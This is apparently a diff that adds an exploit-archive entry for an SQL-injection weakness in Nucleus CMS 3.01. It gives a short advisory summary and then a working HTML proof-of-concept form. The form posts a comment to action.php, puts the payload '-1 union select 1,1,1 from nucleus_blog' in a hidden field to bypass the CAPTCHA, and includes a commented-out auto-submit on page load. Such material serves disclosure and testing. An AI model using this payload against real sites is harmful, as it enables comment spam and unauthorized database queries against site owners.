@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/27127/info
+
+Nucleus CMS is prone to an SQL-injection weakness because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Attackers can exploit this issue in conjunction with other weaknesses in the application to bypass CAPTCHA security checks. Other attacks may also be possible.
+
+Nucleus CMS 3.01 is vulnerable; other versions may also be affected. 
+
+<html> <head> <title>MoBiC-20 Bonus: another Nucleus CAPTCHA bypass exploit (C) 2007 MustLive. http://websecurity.com.ua</title> </head> <!-- <body onLoad="document.hack.submit()"> --> <body> <form name="hack" action="http://site/action.php" method="post"> <input type="hidden" name="action" value="addcomment" /> <input type="hidden" name="code" value="1" /> <input type="hidden" name="url" value="index.php?itemid=1" /> <input type="hidden" name="itemid" value="1" /> <input type="hidden" name="body" value="Captcha bypass test." /> <input type="hidden" name="myid" value="-1 union select 1,1,1 from nucleus_blog" /> <input type="hidden" name="remember" value="0" /> <input type="hidden" name="conf" value="1" /> </form> </body> </html> 
